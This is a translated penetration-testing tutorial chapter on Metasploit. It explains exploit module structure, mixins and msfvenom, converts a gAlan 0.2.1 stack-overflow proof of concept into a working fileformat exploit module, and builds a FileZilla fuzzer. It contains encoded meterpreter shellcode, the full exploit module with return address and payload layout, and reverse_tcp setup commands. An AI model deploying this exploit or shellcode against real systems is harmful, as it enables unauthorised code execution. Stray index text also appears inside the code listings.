# 第八章：使用利用

在本章中，我们将涵盖：

+   利用模块结构

+   常见的利用混合

+   使用 msfvenom

+   将利用转换为 Metasploit 模块

+   移植和测试新的利用模块

+   使用 Metasploit 进行模糊测试

+   编写一个简单的 FileZilla FTP 模糊器

# 介绍

让我们从正式介绍利用开始这一章。**利用**可以是一段软件、一段数据或一系列命令，利用另一种软件中的漏洞或错误执行用户预期的指令。这些用户预期的指令可能会导致受影响软件的异常行为。利用在渗透测试中起着至关重要的作用，因为它可以为目标系统提供一个简单的入口。

到目前为止，我们已经广泛使用利用的力量进行渗透测试。这里需要注意的一点是，我们不能直接将任何独立的概念验证或利用代码直接用于 Metasploit 框架。我们必须将其转换为框架可理解的模块。这个过程与开发辅助模块类似，但有一些额外的字段。本章将涵盖您在框架内使用利用时需要了解的每一个细节。我们不会涵盖与开发利用相关的方面，因为这是一个独立的研究领域。在这里，我们将使用现有的利用概念验证，并看看如何将其添加到框架中。我们还将学习一些重要的混合技术，可以简化将利用转换为 Metasploit 模块的过程。最后，我们将涵盖一些关于模糊测试模块的配方。让我们继续前进吧。

# 利用模块结构

理解利用模块结构非常重要，因为它将帮助我们正确分析不同的利用模块。由于 Metasploit 框架是一个开源项目，其发展取决于社区的贡献。来自全球各地的开发人员将各种漏洞的概念转化为 Metasploit 模块，以便每个人都可以使用。因此，您也可以通过将新发现的漏洞转换为模块来为社区做出贡献。此外，可能会出现需要特定漏洞但框架中没有的情况。了解利用模块结构将帮助您轻松地将漏洞转换为模块。

## 准备工作

让我们从理解框架内利用的模块化结构开始这个配方。它与辅助结构类似，但有一些特定的字段。您可以在`/pentest/exploits/framework3`目录中找到利用模块。让我们分析一下 MSF 中的利用结构。

## 如何做…

正如我们之前所说，利用模块的格式与辅助模块类似，但有一些特定的添加：

```
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::Tcp
include Msf::Exploit::EXE

```

该模块以将 MSF 核心库包含到脚本中开始，并声明一个类，该类扩展了与利用相关的属性。在这个例子中，`Metasploit3`类扩展了`Remote Exploit`库。此外，脚本还包括其他库，如 TCP：

```
def initialize(info = {})
super(update_info(info,
'Name' => '',
'Description')

```

然后，我们有`initialize`函数，用于初始化有关模块的不同值和内容定义。此函数的一些主要定义包括`Name，Description，Author，Version`等：

```
register_options(
[
Opt::RPORT(7777),
], self.class)
end

```

然后，我们有脚本的注册选项部分，负责提供脚本的基本和默认值。这些值可以根据用户的需求进行更改。到目前为止，它与辅助模块非常相似。不同之处在于定义`exploit()`函数：

```
def exploit
connect()
sock.put(payload.encoded)
handler()
disconnect()
end

```

这是模块的主要利用主体，包含 shell 代码或利用模式。这个函数的内容因利用而异。可能存在于远程利用中的一些关键特性列在函数体中。`connect()`用于与目标打开远程连接。它是在`Remote::TCP`库中定义的函数。有效载荷也是利用主体的一个重要部分，它有助于建立反向连接。我们还可以根据需要在利用主体中定义处理程序。

可选地，您还可以声明一个漏洞测试函数`check()`，用于验证目标是否存在漏洞。它验证除有效载荷之外的所有选项。

这是对 Metasploit 的利用模块的基本介绍。在后面的配方中，我们将讨论与框架中的利用相关的一些核心概念。

## 它是如何工作的...

我们刚刚分析的利用模块结构是 Metasploit 使事情变得可理解的方式。考虑函数`def initialize()`。这部分帮助模块捡起常见的利用定义。同样，`register_options()`被 Metasploit 用来捡起不同的参数或为利用模块分配默认参数值。这就是模块化架构变得方便的地方。在本章的后面，我们将看到如何将现有的利用代码转换为 Metasploit 模块。

# 常见的利用混合物

混合物是 Ruby 语言中包含功能到模块的一个全面机制。混合物提供了一种在单一继承语言中实现多重继承的方式，比如 Ruby。在利用模块中使用混合物可以帮助调用利用所需的不同函数。在这个配方中，我们将学习一些重要的 Metasploit 利用混合物。

## 如何做...

让我们快速看一下一些常见的利用混合物。然后，我们将看到它在现有的利用模块中的实现。

+   `Exploit::Remote::TCP:` 这个混合物为模块提供了 TCP 功能。它可以用来建立 TCP 连接。`connect()`和`disconnect()`函数分别负责建立和终止连接。它需要不同的参数，比如`RHOST, RPORT, SSL`。

+   `Exploit::Remote::UDP:` 这个混合物用于模块中的 UDP 功能。UDP 通常被视为比 TCP 更快的连接模式，因此在处理模块时也可以是一个方便的选项。这个混合物进一步包括`Rex::Socket::UDP`，它消除了担心与目标建立套接字连接的开销。

+   `Exploit::Remote::DCERPC:` 这个混合物提供了与远程机器上的 DCE/RPC 服务进行交互的实用方法。这个混合物的方法通常在利用的上下文中非常有用。这个混合物扩展了 TCP 混合物。`dcerpc_call(), dcerpc_bind()`等等是 DCE/RPC 混合物的一些有用函数。

+   `Exploit::Remote::SMB:` 这个混合物定义了可以帮助与远程目标上的 SMB 服务进行通信的函数。`smb_login(), smb_create()`等等是这个混合物中存在的一些有用的函数。

+   `Exploit::BruteTargets:` 这是一个有趣的混合物，用于对目标进行暴力破解。它使用`exploit_target(target)`函数来接收远程目标 IP 并执行暴力破解。这个混合物可以很容易地在不同的暴力破解利用中扩展。

+   `Exploit::Remote::Ftp:` 这个混合物可以用来利用远程目标上的 FTP 服务。混合物包括`Remote::TCP`以便与远程目标建立连接。它使用`connect()`函数，该函数接收`RHOST`和`RPORT`的值，以便与远程系统上的 FTP 服务器连接。

+   `Exploit::Remote::MSSQL:`这个混合物有助于与远程数据库查询。`Mssql_ping()`函数查询数据库的可用性，并将 ping 响应存储为哈希。`Mssql_xpcmdshell()`函数用于使用`xp_cmdshell`执行系统命令。在处理与 MS SQL 相关的利用时，这个混合物非常方便。

+   `Exploit::Capture:`这个混合物有助于嗅探网络中流动的数据包。`open_pcap()`函数用于设置设备以捕获通过它流动的数据包。这个混合物需要机器上安装了 pcap。这个混合物的两个重要函数包括`inject(pkt="", pcap=self.capture)`和`inject_reply()`。前者负责将数据包注入到网络设备中，而后者负责报告由设备返回的结果数据包，具体取决于注入的数据包。

这些是一些在框架内使用利用模块时非常方便的重要利用混合物。使用混合物可以减少重复编写相同模块的开销。这就是为什么模块化架构非常灵活的原因，因为它促进了代码重用。

## 它是如何工作的...

如前所述，混合物用于在单继承语言（如 Ruby）中提供多重继承。我们的意思是，根据需要，我们可以在任何模块中调用不同的功能。例如，如果我们想在我们的利用模块中建立 TCP 连接，就不需要为此定义一个完整的函数。我们可以简单地在我们的模块中调用混合物`Exploit::Remote::TCP`，并利用它的功能。

## 还有更多...

让我们列出一些更重要的混合物。

### 一些更多的混合物

除了之前提到的混合物之外，框架中还有许多其他关键的混合物。这些包括`fileformat, imap, java, smtp, she`等等。您可以在`lib/msf/core/exploit`中找到这些混合物。

# 使用 msfvenom

我们已经在第四章中阅读了有关`mefencode`和`msfpayload`的内容，*客户端利用和防病毒绕过*。让我们进行一个小小的回顾。`msfpayload`用于从有效负载生成二进制，而`msfencode`用于使用不同的编码技术对二进制进行编码。在这里，我们将讨论另一个 Metasploit 工具，它结合了两者。这个工具在生成可以悄悄执行的利用方面起着重要作用。

## 准备工作

要开始我们的`msfvenom`实验，启动终端窗口并传递`msfvenom -h`命令。

## 如何做...

让我们看看各种可用选项：

```
root@bt:~# msfvenom -h
Usage: /opt/framework/msf3/msfvenom [options]
Options:
-p, --payload [payload] Payload to use. Specify a '-' or stdin to use custom..
-l, --list [module_type] List a module type example: payloads, encoders, nops, all
-n, --nopsled [length] Prepend a nopsled of [length] size on to the payload
-f, --format [format] Format to output results in: raw, ruby, rb, perl, pl, bash..
-e, --encoder [encoder] The encoder to use
-a, --arch [architecture] The architecture to use
-s, --space [length] The maximum size of the resulting payload
-b, --bad-chars [list] The list of characters to avoid example: '\x00\xff'
-i, --iterations [count] The number of times to encode the payload
-c, --add-code [path] Specify an additional win32 shellcode file to include
-x, --template [path] Specify a custom executable file to use as a template
-k, --keep Preserve the template behavior and inject the payload as..
-h, --help Show this message 

```

有一些有趣的参数需要注意。`-n`参数创建有效负载大小的 NOP 滑坡。另一个有趣的参数是`-b`，它使我们有能力避免利用中的常见字符，如`\x00`。这在规避防病毒程序方面非常有帮助。其余的参数与我们可以在`msfpayload`和`msfencode`中找到的参数类似。

### 注意

NOP 滑坡，NOP 滑梯或 NOP 坡是一系列 NOP（无操作）指令，旨在“滑动”CPU 的指令执行流到最终期望的目的地。

## 它是如何工作的...

要使用`msfvenom`，我们将不得不传递有效负载以及编码样式。让我们在终端窗口上执行这个任务：

```
root@bt:~# msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3
[*] x86/shikata_ga_nai succeeded with size 325 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 352 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 379 (iteration=3)
buf =
"\xdb\xdb\xbe\x0a\x3a\xfc\x6d\xd9\x74\x24\xf4\x5a\x29\xc9" +
"\xb1\x52\x31\x72\x18\x83\xea\xfc\x03\x72\x1e\xd8\x09\xb6" +
"\xce\xc5\x86\x6d\x1a\xa8\xd8\x88\xa8\xbc\x51\x64\xe5\xf2" +
"\xd1\xb7\x80\xed\x66\x72\x6e\x0d\x1c\x68\x6a\xae\xcd\x0e" +
"\x33\x90\x1d\x73\x82\xd8\xd7\xe0\x87\x76\xbd\x25\xf4\x23" +
"\x4d\x38\xc2\xc3\xe9\xa1\x7e\x31\xc5\xe4\x84\x2a\x3b\x37" +
"\xb3\xd6\x13\xc4\x09\x89\xd0\x95\x21\x10\x6b\x83\x94\x3d" + 
```

注意已传递的不同参数。`-b`参数的存在将避免在 shell 代码中使用`\x00`（空字节）。我们可以在我们的利用程序中使用这个 shell 代码。

`msfvenom`可以是一个非常方便的工具，可以快速生成使用框架中可用的不同有效负载的 shell 代码。这些 shell 代码可以在利用代码中实现，以便在利用漏洞后与攻击者提供反向连接。

# 将利用转换为 Metasploit 模块

到目前为止，我们已经使用利用模块来 compromise 我们的目标。在这个配方中，我们将把我们的模块使用经验提升到一个新的水平。我们将尝试使用可用的概念验证来开发一个完整的利用模块。将利用转换为模块的知识对于将任何新的利用转换为框架模块并执行渗透测试而不必等待 Metasploit 团队的更新是必不可少的。此外，并不是每个利用都会以框架模块的形式可用。因此，让我们继续进行配方，并看看我们如何使用可用的概念验证构建我们自己的利用模块。

## 准备工作

首先，让我们选择任何可以转换为模块的利用。让我们考虑可以从[`www.exploit-db.com/exploits/10339`](http://www.exploit-db.com/exploits/10339)下载的 gAlan 零日利用。

**gAlan**是一个音频处理工具（在线和离线），适用于 X Windows 和 Win32。它允许您以模块化的方式通过链接表示原始音频处理组件的图标来构建合成器、效果链、混音器、序列器、鼓机等。

对于 gAlan 的利用只有在受害者使用该应用程序并且攻击者事先知道这一点时才会起作用。因此，攻击者必须知道受害者机器上安装了哪些应用程序。

## 如何做...

在开始利用转换之前，有必要了解一些关于堆栈溢出攻击的知识。

在软件中，堆栈溢出发生在调用堆栈上使用了太多内存时。调用堆栈是包含有限内存量的软件的运行时堆栈，通常在程序开始时确定。调用堆栈的大小取决于许多因素，包括编程语言、机器架构、多线程和可用内存量。当程序尝试使用的空间超过调用堆栈上可用的空间时，堆栈被认为溢出，通常导致程序崩溃。基本上，`ESP`、`EIP`和`EAX`是在利用期间经常受到攻击的寄存器。

+   `ESP:` 指向堆栈顶部

+   `EIP:` 指向下一条指令的位置

+   `EAX:` 要执行的指令

由于在堆栈中所有寄存器都是线性存储的，我们需要知道`EIP`寄存器的确切缓冲区大小，以便溢出它将给我们`EAX`和随后执行有效载荷。

一旦我们有了利用的概念验证，下一步将是尽可能收集有关利用的信息。让我们仔细看看概念验证。前几行包括存储在`$shellcode`变量中的 shellcode。这可以使用框架中可用的任何有效载荷使用`msfpayload`或`msfvenom`生成。

```
$magic = "Mjik";
$addr = 0x7E429353; # JMP ESP @ user32,dll
$filename = "bof.galan";
$retaddr = pack('l', $addr);
$payload = $magic . $retaddr x 258 . "\x90" x 256 . $shellcode;

```

主要的利用代码以`$magic`开头，其中包含一个四字节的字符串。然后，我们有`$addr`变量，其中包含`ESP`堆栈指针的位置。然后我们有`$filename`变量，其中包含要在后期创建的文件名。`$retaddr`包含堆栈指针将指向并导致溢出后利用代码执行的返回地址的位置。最后，我们有有效载荷的执行，负责利用和 shellcode 执行。

我们从利用中知道我们的 shellcode 最多可以达到 700 字节。我们有效载荷的总长度为 1214 字节。这些信息将有助于构建我们的模块。

我们可以使用重复的返回地址，也可以找到`EIP`被覆盖时的大小。Metasploit 有一个名为`pattern_create.rb`的优秀工具，可以帮助找到`EIP`被覆盖的确切位置。这个工具生成一串唯一模式的字符串，可以传递给利用代码，并通过调试器，我们可以找到`EIP`中存储的字符串模式。让我们创建一个 5000 个字符的字符串：

```
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb
Usage: pattern_create.rb length [set a] [set b] [set c]
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb 5000 
```

现在，编辑利用脚本，将`$payload`替换为另一个测试变量`$junk`，并将 5000 个字符的字符串复制到这个变量中。现在，使用这个脚本测试应用程序，并检查`EIP`中存储的模式。我假设您已经了解了反向和调试应用程序的基础知识。假设存储在`EIP`中的字符串模式是"234abc"。现在我们将使用另一个 Metasploit 工具称为`pattern_offset.rb`来计算我们传递的字符串中存在这个模式的位置：

```
root@bt:/pentest/exploits/framework3/tools# ./pattern_offset.rb 0x234abc 5000
1032 
```

因此，要传递的总字节数，以便获得`EIP`的确切位置，为 1032。

现在我们已经收集了关于利用的足够信息，我们准备将其转换为 Metasploit 模块。

## 它是如何工作的...

让我们开始构建我们的模块。脚本的第一行将是导入库并创建父类。然后，我们将定义包含有关利用的信息并注册选项的`initialize()`函数：

```
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
include Msf::Exploit::FILEFORMAT
def initialize(info = {})
super(update_info(info,
'Name' => 'gAlan 0.2.1 Buffer Overflow Exploit',
'Description' => %q{
This module exploits a stack overflow in gAlan 0.2.1
By creating a specially crafted galan file, an attacker may be able
to execute arbitrary code.
},
'License' => MSF_LICENSE,
'Author' => [ 'original by Jeremy Brown' ],
'Version' => '$Revision: 7724 $',
'References' =>
[
[ 'URL', 'http://www.exploit-db.com/exploits/10339' ],
],
'DefaultOptions' =>
{
'EXITFUNC' => 'process',
},
'Payload' =>
{
'Space' => 1000,
'BadChars' => "\x00\x0a\x0d\x20\x0c\x0b\x09",
'StackAdjustment' => -3500,
Metasploit moduleworking},
'Platform' => 'win',
'Targets' =>
[
[ 'Windows XP Universal', { 'Ret' => 0x100175D0} ], # 0x100175D0 call esi @ glib-1_3
],
'Privileged' => false,
'DefaultTarget' => 0))
register_options(
[
OptString.new('FILENAME', [ false, 'The file name.', 'evil.galan']),
], self.class)
end

```

到目前为止，一切都很简单明了。转折点在于定义`exploit()`函数。让我们看看如何做到这一点。

我们将从原始利用脚本的前四个字节开始，即`$magic = "Mjik"`;

它将在我们的模块中被替换为`sploit = "Mjik"`。

然后，我们继续构建我们的缓冲区。由于我们已经找到了`EIP`被覆盖的位置，我们可以将重复的返回地址值替换为：

```
sploit << rand_text_alpha_upper(1028);
sploit << [target.ret].pack('V');

```

然后，我们将添加我们的 nop 滑块。因此，利用脚本的这部分将更改为模块中的以下行：

```
sploit << "\x90" * 45

```

最后，我们构建完整的 shellcode：

```
sploit << payload.encoded

```

最后，我们可以将这些脚本行组合在`exploit()`函数下。

```
def exploit
sploit = "Mjik"
sploit << rand_text_alpha_upper(1028)
sploit << [target.ret].pack('V')
sploit << "\x90" * 45
sploit << payload.encoded
galan = sploit
print_status("Creating '#{datastore['FILENAME']}' file ...")
file_create(galan)
end 
```

这是一个简单明了的演示，说明了我们如何将现有的利用转换为 Metasploit 模块。这个过程的难度水平可能因利用而异。了解更多的最佳方法是查看 Metasploit 库中可用的利用模块。在下一个示例中，我们将学习如何将这个利用模块移植到框架中，以便我们可以将其用于渗透测试。

# 移植和测试新的利用模块

在上一个示例中，我们学习了如何使用现有的概念来开发 Metasploit 的完整利用模块。在这个示例中，我们将把模块保存在一个合适的位置，然后测试它，看看是否一切顺利。

## 准备工作

非常重要的是要注意我们将存储利用模块的文件夹。这可以帮助您跟踪不同的模块，并且还可以帮助框架了解基本模块的使用。现在您有了完整的模块脚本，让我们找一个合适的位置来保存它。

## 如何做...

由于这是一个利用模块，针对影响特定文件格式的 Windows 操作系统，我们将不得不相应地选择模块位置。查看`modules/exploits/windows`目录，您可以找到一个特定的文件夹用于`fileformat`利用模块。这是我们可以保存模块的位置。让我们将其保存为`galan_fileformat_bof.rb`。

## 它是如何工作的...

下一个和最后的任务将是检查我们的模块是否正常运行。到目前为止，我们已经与模块一起工作了很多，所以这一步将很容易。我们将遵循迄今为止我们所使用的相同过程：

```
msf > use exploit/windows/fileformat/galan_fileformat_bof
msf exploit(galan_fileformat_bof) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(galan_fileformat_bof) > set LHOST 192.168.56.101
msf exploit(galan_fileformat_bof) > exploit 
```

一旦传递了利用命令，模块将执行并创建一个文件，可以用来在目标机器上引起溢出。

这完成了我们的模块创建和执行过程。您可能已经看到，该过程很简单。真正的努力在于将利用脚本正确转换为框架模块。您可以根据需要调试或修改任何现有模块。您还可以将任何新创建的模块提交给 Metasploit 社区，以帮助其他人从中受益。

# 使用 Metasploit 进行模糊测试

模糊测试或模糊是一种软件测试技术，它包括使用随机数据注入来查找实现错误。模糊脚本生成格式不正确的数据，并将其传递给特定的目标实体，以验证其溢出容量。Metasploit 提供了几个模糊模块，这些模块在利用开发中可能会有所帮助。让我们更多地了解一下模糊测试的基础知识，以及如何使用 Metasploit 模块作为潜在的模糊器。

## 准备就绪

在我们跳转到 Metasploit 模糊器模块之前，让我们简要概述一下模糊测试及其类型。

模糊测试被视为一种黑盒测试技术，用于测试软件的最大溢出容量。模糊测试被积极用于查找应用程序中的错误。

模糊器可用于测试软件、协议和文件格式。模糊器自动化了数据生成和注入的过程。我们可以控制要注入的数据或数据包的大小。

模糊器将尝试对攻击进行组合：

+   数字（有符号/无符号整数，浮点数等）

+   字符（URL 和命令行输入）

+   元数据：用户输入文本（`id3`标签）

+   纯二进制序列

根据我们所针对的应用程序或协议的类型，我们可以设置我们的模糊器以生成数据/数据包来测试其溢出。Metasploit 包含几个模糊器模块，可用于对应用程序和协议进行黑盒测试。这些模块可以位于`modules/auxiliary/fuzzers`。让我们分析这些模块的实现。

## 如何做…

让我们尝试使用基于协议的模糊器模块。Metasploit 有一个名为`client_ftp.rb`的 FTP 模块，它充当 FTP 服务器并向 FTP 客户端发送响应：

```
msf > use auxiliary/fuzzers/ftp/client_ftp
msf auxiliary(client_ftp) > show options
Module options:
Name Current Setting Required Description
---- --------------- -------- -----------
CYCLIC true yes Use Cyclic pattern instead..
ENDSIZE 200000 yes Max Fuzzing string size.
ERROR false yes Reply with error codes only
EXTRALINE true yes Add extra CRLF's in..
FUZZCMDS LIST.. yes Comma separated list..
RESET true yes Reset fuzzing values after..
SRVHOST 0.0.0.0 yes The local host to listen on.
SRVPORT 21 yes The local port to listen on.
SSL false no Negotiate SSL for incoming..
SSLVersion SSL3 no Specify the version of SSL..
STARTSIZE 1000 yes Fuzzing string startsize.
STEPSIZE 1000 yes Increment fuzzing string.. 
```

您可以看到我们有许多有趣的参数可供使用。让我们找出每个参数所具有的功能。

+   `CYCLIC`选项用于设置循环模式作为模糊数据。这是为了确定偏移量，因为字符串的每四个字节都是唯一的。如果设置为 false，则模糊器将使用一串 A 作为模糊数据。

+   `ENDSIZE`选项定义了发送回 FTP 客户端的模糊数据的最大长度。默认情况下，它设置为 20000 字节。

+   如果将`ERROR`选项设置为 true，则将使用错误代码回复 FTP 客户端。

+   `EXTRALINE`选项是用于目录列表的模糊测试。如果向客户端发送一个非常大的目录名称请求，一些 FTP 客户端可能会崩溃。

+   `FUZZCMDS`选项允许我们定义哪个响应需要进行模糊处理。可能的请求包括`LIST、NLST、LS、RETR`。我们还可以设置`*`以模糊处理所有命令。

+   `SRVHOST`选项是模糊器将与 FTP 服务器绑定的 IP 地址。对于本地机器，我们可以使用`0.0.0.0`。

+   `SRVPORT`选项是 FTP 服务器端口，默认为 21。

+   `STARTSIZE`选项用于定义模糊数据的初始数据长度。

+   `STEPSIZE`选项用于定义每次溢出失败时的增量。

在使用模糊器时应谨慎。如果未传递正确的参数值，则模糊测试可能会失败。您可以随时参考模块源代码，以深入了解模糊器。让我们运行我们的 FTP 客户端模糊器，看看返回的输出是什么：

```
msf auxiliary(client_ftp) > run
[*] Server started.
[*] Client connected : 192.168.56.102
[*] - Set up active data port 20
[*] Sending response for 'WELCOME' command, arg
[*] Sending response for 'USER' command, arg test
[*] Sending response for 'PASS' command, arg test
[*] - Set up active data port 16011
[*] Sending response for 'PORT' command, arg 192,168,0,188,62,139
[*] Handling NLST command
[*] - Establishing active data connection
[*] - Data connection set up
[*] * Fuzzing response for LIST, payload length 1000
[*] (i) Setting next payload size to 2000
[*] - Sending directory list via data connection 
```

输出有几个需要注意的地方。首先，FTP 服务器在攻击机器上启动。然后，它会与 FTP 客户端连接。然后，它开始向客户端机器发送不同的响应命令。模糊处理过程从`NLST`命令开始。然后，它继续到 LIST 等等。

这是 fuzzer 模块如何工作的简单演示。在下一个示例中，我们将深入研究通过构建我们自己的模糊模块来进行协议模糊。

## 它是如何工作的...

Fuzzers 根据我们想要模糊的应用程序创建不同的测试用例。在我们的例子中，FTP 服务器可以通过发送随机数据包然后分析其响应来进行模糊处理。数据包可以模糊网络上的以下属性：

+   **数据包头：**模糊器可以在标头中插入任意长度和值的随机数据包并分析其响应。

+   **数据包校验和：**在特定条件下，模糊器也可以操纵校验和值。

+   **数据包大小：**可以向网络应用程序发送任意长度的数据包以确定崩溃。

一旦崩溃或溢出被报告，fuzzer 可以返回其测试用例以提供溢出数据。

# 编写一个简单的 FileZilla FTP fuzzer

我们在上一个示例中分析了 fuzzer 模块的工作原理。让我们通过构建我们自己的小型 FTP fuzzer 来进一步深入了解 FileZilla FTP 服务器。

## 如何做...

构建 fuzzer 的基本模板将类似于我们讨论过的用于开发辅助模块的模板。因此，我们的基本模板应如下所示：

```
require 'msf/core'
class Metasploit3 < Msf::Auxiliary
include Msf::Auxiliary::Scanner
def initialize
super(
'Name' => 'FileZilla Fuzzer',
'Version' => '$Revision: 1 $',
'Description' => 'Filezilla FTP fuzzer',
'Author' => 'Abhinav_singh',
'License' => MSF_LICENSE
)
register_options( [
Opt::RPORT(14147),
OptInt.new('STEPSIZE', [ false, "Increase string size each iteration with this number of chars",10]),
OptInt.new('DELAY', [ false, "Delay between connections",0.5]),
OptInt.new('STARTSIZE', [ false, "Fuzzing string startsize",10]),
OptInt.new('ENDSIZE', [ false, "Fuzzing string endsize",20000])
], self.class)
end

```

因此，我们已经导入了 MSF 库，创建了一个类，并定义了我们的选项。下一步将是定义 fuzzer 的主体。

```
def run_host(ip)
udp_sock = Rex::Socket::Udp.create(
'Context' =>
{
'Msf' => framework,
'MsfExploit' => self,
}
)
startsize = datastore['STARTSIZE'] # fuzz data size to begin with
count = datastore['STEPSIZE'] # Set count increment
simple FileZilla FTP fuzzerwritingwhile count < 10000 # While the count is under 10000 run
evil = "A" * count # Set a number of "A"s equal to count
pkt = "\x00\x02" + "\x41" + "\x00" + evil + "\x00" # Define the payload
udp_sock.sendto(pkt, ip, datastore['RPORT']) # Send the packet
print_status("Sending: #{evil}")
resp = udp_sock.get(1) # Capture the response
count += 100 # Increase count by 10, and loop
end
end
end 
```

让我们分析脚本。脚本以创建 UDP 套接字开始，该套接字将需要与 FileZilla 服务器建立连接。然后，我们声明变量`startsize`和`count`，它们分别保存 fuzzer 的数据大小起始值和增量长度的值。然后，我们设置一个循环，在该循环下我们声明我们的恶意字符串和将作为数据包（pkt）发送的有效负载格式。

然后，脚本尝试使用`udp_sock_sendto`函数将数据包发送到服务器，并使用`resp=udp_sock.get()`捕获其响应。此外，每次接收到响应时，数据包的计数都会增加 100。

## 它是如何工作的...

要开始使用该模块，我们需要将其保存在`modules/auxiliary/fuzzers/ftp`下。让我们将 fuzzer 模块命名为`filezilla_fuzzer.rb：`

```
msf > use auxiliary/fuzzers/ftp/filezilla_fuzzer
msf auxiliary(filezilla_fuzzer) > show options
Module options (auxiliary/fuzzers/ftp/filezilla_fuzzer):
Name Current Setting Required Description
---- --------------- -------- -----------
DELAY 0.5 no Delay between..
ENDSIZE 20000 no Fuzzing string endsize
RHOSTS yes The target address
RPORT 14147 yes The target port
STARTSIZE 10 no Fuzzing string startsize
STEPSIZE 10 no Increase string size.. 
```

因此，我们的模块运行正常，并向我们显示可用的选项。让我们传递相应的值并查看我们传递`run`命令时会发生什么：

```
msf auxiliary(filezilla_fuzzer) > set RHOSTS 192.168.56.1
RHOSTS => 192.168.56.1
msf auxiliary(filezilla_fuzzer) > run
[*] Sending: AAAAAAAAAA
[*] Sending: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
```

太棒了！fuzzer 开始向服务器发送字符串，并在服务器崩溃或循环结束之前继续该过程。如果循环在崩溃之前结束，那么您可以修改脚本以发送更大的字符串长度。这是使用 Metasploit 模糊软件的简单演示。通常不建议将 Metasploit 用作大型软件的模糊平台。我们有几个专门用于模糊软件和应用程序的专用框架。

## 还有更多...

让我们快速看一下一个模糊框架，如果您想增强您对模糊和利用开发的了解，可以在其上工作。

### Antiparser 模糊框架

Antiparser 是用 Python 编写的模糊框架。它有助于专门用于构建 fuzzer 的随机数据的创建。该框架可用于开发将在多个平台上运行的 fuzzer，因为该框架仅取决于 Python 解释器的可用性。

Antiparser 可以从[`sourceforge.net/projects/antiparser/`](http://sourceforge.net/projects/antiparser/)下载。
